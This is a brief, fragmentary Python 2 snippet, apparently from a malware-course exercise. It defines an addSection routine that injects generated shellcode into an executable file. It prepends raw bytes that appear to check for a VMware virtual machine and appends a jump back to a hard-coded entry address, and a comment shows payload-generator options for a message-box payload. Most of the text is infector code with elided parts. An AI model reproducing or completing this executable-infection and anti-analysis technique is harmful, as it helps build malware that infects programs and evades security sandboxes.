...
# TEXT="18520084-18520509-18520532" ICON=INFORMATION EXITFUNC=process \
# TITLE="NT230" -f python
...
def addSection(path,shellcode):
    ...
    print o_oep
    shellcode= b'\xB8\x68\x58\x4D\x56\xB9\x0A\x00\x00\x00\x66\xBA\x58\x56\xED\x81\xFB\x68\x58\x4D\x56\x75\x07\xB8\xE4\x94\x40\x00\xFF\xD0'+shellcode+ b'\xe4\x94\x40\x00\xff\xd0'
